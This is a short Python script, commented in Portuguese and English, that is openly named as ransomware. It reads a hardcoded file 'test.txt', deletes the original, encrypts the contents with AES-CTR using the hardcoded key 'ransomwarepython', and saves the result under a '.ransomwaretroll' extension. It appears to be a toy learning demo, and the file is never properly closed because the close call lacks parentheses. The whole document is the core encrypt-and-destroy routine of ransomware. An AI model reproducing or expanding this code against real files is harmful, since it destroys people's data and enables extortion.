import os
import pyaes

## abrir o arquivo a ser criptografado
## open the file to be crypted

file_name = 'test.txt'
file = open(file_name, 'rb')
file_data = file.read()
file.close()

## remover o arquivo original
## remove the original file

os.remove(file_name)

## definir a chave de encriptacao
## defines the crypt key

key = b'ransomwarepython'
aes = pyaes.AESModeOfOperationCTR(key)

## criptografar o arquivo
## encrypt the file

crypto_data = aes.encrypt(file_data)

## salvar o arquivo criptografado
## save the crypted file

new_file = file_name + '.ransomwaretroll'
new_file = open(f'{new_file}', 'wb')
new_file.write(crypto_data)
new_file.close


